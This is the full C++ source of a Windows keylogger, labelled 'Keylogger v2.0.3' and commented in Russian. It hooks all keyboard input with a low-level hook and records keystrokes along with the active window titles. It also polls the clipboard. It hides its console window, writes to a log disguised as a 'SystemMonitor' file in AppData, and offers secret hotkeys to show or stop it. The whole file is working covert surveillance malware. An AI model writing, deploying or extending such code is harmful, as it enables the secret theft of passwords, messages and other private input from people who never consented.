#include <windows.h>
#include <fstream>
#include <string>
#include <map>
#include <sstream>
#include <iomanip>
#include <atomic>
#include <shlobj.h>     // SHGetFolderPathA
#include <shellapi.h>   // ShellExecuteA
#include <thread>
#include <mutex>
#include <chrono>

std::atomic<bool> g_running{true};
std::string g_logFilePath;
HANDLE g_hMutex = nullptr;
HHOOK g_hHook = nullptr;

std::mutex g_logMutex;
std::ofstream g_logFile;
std::mutex g_windowTitleMutex;
std::string g_cachedWindowTitle;
std::chrono::steady_clock::time_point g_lastWindowTitleUpdate;

// Карта специальных клавиш
std::map<DWORD, std::string> specialKeys = {
    {VK_BACK, "[BACKSPACE]"},   {VK_TAB, "[TAB]"},         {VK_RETURN, "[ENTER]"},
    {VK_ESCAPE, "[ESC]"},       {VK_SPACE, "[SPACE]"},     {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},      {VK_UP, "[UP]"},           {VK_DOWN, "[DOWN]"},
    {VK_INSERT, "[INSERT]"},    {VK_DELETE, "[DEL]"},      {VK_HOME, "[HOME]"},
    {VK_END, "[END]"},          {VK_PRIOR, "[PGUP]"},      {VK_NEXT, "[PGDN]"},
    {VK_CAPITAL, "[CAPS]"},     {VK_NUMLOCK, "[NUM]"},     {VK_SCROLL, "[SCROLL]"},
    {VK_F1, "[F1]"},            {VK_F2, "[F2]"},           {VK_F3, "[F3]"},
    {VK_F4, "[F4]"},            {VK_F5, "[F5]"},           {VK_F6, "[F6]"},
    {VK_F7, "[F7]"},            {VK_F8, "[F8]"},           {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},          {VK_F11, "[F11]"},         {VK_F12, "[F12]"},
    {VK_LWIN, "[LWIN]"},        {VK_RWIN, "[RWIN]"},       {VK_APPS, "[MENU]"},
    {VK_PRINT, "[PRINT]"},      {VK_PAUSE, "[PAUSE]"},
    // L/R модификаторы
    {VK_LSHIFT, "[LSHIFT]"},    {VK_RSHIFT, "[RSHIFT]"},
    {VK_LCONTROL, "[LCTRL]"},   {VK_RCONTROL, "[RCTRL]"},
    {VK_LMENU, "[LALT]"},       {VK_RMENU, "[RALT]"}
};

// Таблица для русской раскладки (QWERTY → ЙЦУКЕН)
// Русская раскладка — точное соответствие по твоему описанию (стандартная ЙЦУКЕН)
const char* ruLower[26] = {
    // A → Z
    "ф",  // A
    "и",  // B
    "с",  // C
    "в",  // D
    "у",  // E
    "а",  // F
    "п",  // G
    "р",  // H
    "ш",  // I
    "о",  // J
    "л",  // K
    "д",  // L
    "ь",  // M
    "т",  // N
    "щ",  // O
    "з",  // P
    "й",  // Q
    "к",  // R
    "ы",  // S
    "е",  // T
    "г",  // U
    "м",  // V
    "ц",  // W
    "ч",  // X
    "н",  // Y
    "я"   // Z
};

const char* ruUpper[26] = {
    "Ф", "И", "С", "В", "У", "А", "П", "Р", "Ш", "О", "Л", "Д", "Ь", "Т", "Щ", "З", "Й", "К", "Ы", "Е", "Г", "М", "Ц", "Ч", "Н", "Я"
};
// Вспомогательные функции
std::string WideToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
    if (len <= 0) return {};
    std::string s(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), s.data(), len, nullptr, nullptr);
    return s;
}

std::string EscapeLogString(const std::string& str) {
    std::stringstream ss;
    for (unsigned char c : str) {
        if (c == '\n')      ss << "\\n";
        else if (c == '\r') ss << "\\r";
        else if (c == '\t') ss << "\\t";
        else if (c == '"')  ss << "\\\"";
        else if (c == '\\') ss << "\\\\";
        else if (c < 32 || c == 127) {
            ss << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)c;
        } else {
            ss << c;  // Русские буквы остаются как есть
        }
    }
    return ss.str();
}

std::string GetCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
    ss << "." << std::setfill('0') << std::setw(3) << ms.count();
    return ss.str();
}

std::string GetLogFilePath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        std::string appdata = path;
        std::string dir = appdata + "\\SystemMonitor";
        CreateDirectoryA(dir.c_str(), nullptr);
        return dir + "\\ksystem.log";
    }
    return "ksystem.log";
}

bool OpenLogFile() {
    std::lock_guard<std::mutex> lock(g_logMutex);
    g_logFile.open(g_logFilePath, std::ios::app | std::ios::binary);
    if (!g_logFile) return false;
    g_logFile.seekp(0, std::ios::end);
    if (g_logFile.tellp() == 0) {
        const unsigned char bom[] = {0xEF, 0xBB, 0xBF};
        g_logFile.write(reinterpret_cast<const char*>(bom), 3);
    }
    return true;
}

void CloseLogFile() {
    std::lock_guard<std::mutex> lock(g_logMutex);
    if (g_logFile.is_open()) g_logFile.close();
}

void SafeLog(const std::string& msg) {
    std::lock_guard<std::mutex> lock(g_logMutex);
    if (!g_logFile.is_open()) return;
    std::string timestamp = GetCurrentTimestamp();
    std::string line = "[" + timestamp + "] " + msg + "\n";
    g_logFile.write(line.c_str(), line.length());
    g_logFile.flush();
}

std::string GetActiveWindowTitleCached() {
    auto now = std::chrono::steady_clock::now();
    {
        std::lock_guard<std::mutex> lock(g_windowTitleMutex);
        if (std::chrono::duration_cast<std::chrono::milliseconds>(now - g_lastWindowTitleUpdate).count() < 500) {
            return g_cachedWindowTitle;
        }
    }

    HWND hwnd = GetForegroundWindow();
    std::string title;
    if (hwnd) {
        wchar_t buf[1024]{};
        int len = GetWindowTextW(hwnd, buf, 1024);
        if (len > 0) title = WideToUtf8(std::wstring(buf, len));
    }

    {
        std::lock_guard<std::mutex> lock(g_windowTitleMutex);
        g_cachedWindowTitle = title;
        g_lastWindowTitleUpdate = now;
    }
    return title;
}

std::string GetClipboardTextUTF8() {
    if (!OpenClipboard(nullptr)) return "";
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (!hData) {
        CloseClipboard();
        return "";
    }
    wchar_t* psz = (wchar_t*)GlobalLock(hData);
    if (!psz) {
        CloseClipboard();
        return "";
    }
    std::wstring ws(psz);
    GlobalUnlock(hData);
    CloseClipboard();
    return WideToUtf8(ws);
}

std::string GetKeyName(DWORD vkCode, DWORD scanCode) {
    auto it = specialKeys.find(vkCode);
    if (it != specialKeys.end()) return it->second;

    if (vkCode >= VK_F1 && vkCode <= VK_F24)
        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";

    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
        return std::string(1, '0' + (vkCode - VK_NUMPAD0)) + " (NUM)";

    bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
    if (ctrl && vkCode >= 'A' && vkCode <= 'Z')
        return "[CTRL+" + std::string(1, static_cast<char>(vkCode)) + "]";

    // Обработка букв A-Z с русской раскладкой
    if (vkCode >= 'A' && vkCode <= 'Z') {
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        bool upper = shift ^ caps;
        int idx = vkCode - 'A';
        return upper ? ruUpper[idx] : ruLower[idx];
    }

    // Остальные символы (знаки, цифры) через ToUnicodeEx
    BYTE ks[256]{};
    GetKeyboardState(ks);
    WCHAR buf[8]{};
    int res = ToUnicodeEx(vkCode, scanCode, ks, buf, 8, 0, GetKeyboardLayout(0));
    if (res > 0) {
        return WideToUtf8(std::wstring(buf, res));
    }

    char tmp[16];
    snprintf(tmp, sizeof(tmp), "[VK%02X]", vkCode);
    return tmp;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (!g_running || nCode != HC_ACTION) 
        return CallNextHookEx(nullptr, nCode, wParam, lParam);

    KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;

    if ((wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN) || (kbd->flags & LLKHF_INJECTED))
        return CallNextHookEx(nullptr, nCode, wParam, lParam);

    bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
    bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
    bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;

    std::string key = GetKeyName(kbd->vkCode, kbd->scanCode);
    std::string win = GetActiveWindowTitleCached();

    if (ctrl && shift && alt && kbd->vkCode == 'K') {
        ShowWindow(GetConsoleWindow(), SW_SHOW);
        SafeLog("[DEBUG] Console shown by Ctrl+Shift+Alt+K");
    }
    if (ctrl && shift && alt && kbd->vkCode == 'Q') {
        g_running = false;
        SafeLog("[SHUTDOWN] Stopped by Ctrl+Shift+Alt+Q");
        PostQuitMessage(0);
        return CallNextHookEx(nullptr, nCode, wParam, lParam);
    }

    if (!key.empty() && (key.size() > 1 || (key[0] >= 32 && key[0] <= 126))) {
        SafeLog("[KEY] Window: \"" + EscapeLogString(win) + "\" | \"" + EscapeLogString(key) + "\"");
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void ClipboardMonitorThread() {
    std::string lastClip;
    bool init = false;
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
        std::string clip = GetClipboardTextUTF8();
        if (clip.empty() || (init && clip == lastClip)) continue;
        std::string win = GetActiveWindowTitleCached();
        std::string disp = clip.length() > 500 ? clip.substr(0, 500) + "... [truncated]" : clip;
        SafeLog("[CLIPBOARD] Window: \"" + EscapeLogString(win) + "\" | \"" + EscapeLogString(disp) + "\"");
        lastClip = clip;
        init = true;
    }
}

void WindowTitleUpdateThread() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
        GetActiveWindowTitleCached();
    }
}

LRESULT CALLBACK CmdWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_COPYDATA) {
        COPYDATASTRUCT* cds = (COPYDATASTRUCT*)lParam;
        if (cds && cds->dwData == 1) {
            g_running = false;
            PostQuitMessage(0);
        }
        return TRUE;
    }
    if (msg == WM_DESTROY) {
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

HWND CreateCmdWindow() {
    WNDCLASSA wc{};
    wc.lpfnWndProc = CmdWndProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = "KeyloggerCmdWnd";
    RegisterClassA(&wc);
    return CreateWindowExA(0, "KeyloggerCmdWnd", "KeyloggerMonitor", 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, wc.hInstance, nullptr);
}

class MutexGuard {
public:
    explicit MutexGuard(const std::string& name) : m_handle(CreateMutexA(nullptr, TRUE, name.c_str())), m_owns(m_handle && GetLastError() != ERROR_ALREADY_EXISTS) {}
    ~MutexGuard() { if (m_handle) { if (m_owns) ReleaseMutex(m_handle); CloseHandle(m_handle); } }
    bool IsOwner() const { return m_owns; }
private:
    HANDLE m_handle;
    bool m_owns;
};

void RunKeylogger() {
    MutexGuard mutexGuard("Global\\KeyloggerMonitorMutex");
    if (!mutexGuard.IsOwner()) return;

    g_logFilePath = GetLogFilePath();
    if (!OpenLogFile()) return;

    SafeLog("=== Keylogger v2.0.3 Started ===");
    SafeLog("Log Path: " + g_logFilePath);

    HWND cmdWnd = CreateCmdWindow();
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
    if (!g_hHook) {
        SafeLog("[ERROR] Failed to set keyboard hook");
        CloseLogFile();
        if (cmdWnd) DestroyWindow(cmdWnd);
        return;
    }

    std::thread clipboardThread(ClipboardMonitorThread);
    std::thread windowTitleThread(WindowTitleUpdateThread);

    MSG msg;
    while (g_running && GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (cmdWnd) DestroyWindow(cmdWnd);
    g_running = false;
    clipboardThread.join();
    windowTitleThread.join();

    SafeLog("=== Keylogger v2.0.3 Stopped ===");
    CloseLogFile();
}

bool SendStopCommand() {
    HWND hwnd = FindWindowA(nullptr, "KeyloggerMonitor");
    if (!hwnd) return false;
    COPYDATASTRUCT cds{};
    cds.dwData = 1;
    SendMessage(hwnd, WM_COPYDATA, 0, (LPARAM)&cds);
    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::string cmd = lpCmdLine ? lpCmdLine : "";

    if (cmd.find("--stop") != std::string::npos || cmd.find("-s") != std::string::npos) {
        SendStopCommand() ? MessageBoxA(nullptr, "Stop command sent", "Info", MB_OK) : MessageBoxA(nullptr, "Not running", "Error", MB_ICONERROR);
        return 0;
    }

    if (cmd.find("--show-log") != std::string::npos) {
        std::string path = GetLogFilePath();
        ShellExecuteA(nullptr, "open", "notepad.exe", path.c_str(), nullptr, SW_SHOW);
        return 0;
    }

    if (cmd.find("--log-path") != std::string::npos) {
        std::string path = GetLogFilePath();
        MessageBoxA(nullptr, path.c_str(), "Log Path", MB_OK);
        return 0;
    }

    if (cmd.find("--help") != std::string::npos || cmd.find("-h") != std::string::npos) {
        MessageBoxA(nullptr, "Keylogger v2.0.3\n\n"
		                     "Commands:\n"
							 "--stop\n"
							 "--show-log\n"
							 "--log-path\n"
							 "--help\n\n"
							 "Secret: Ctrl+Shift+Alt+K/Q", "Help", MB_OK);
        return 0;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    RunKeylogger();
    return 0;
}

int main() {
    return WinMain(GetModuleHandle(nullptr), nullptr, GetCommandLineA(), SW_HIDE);
}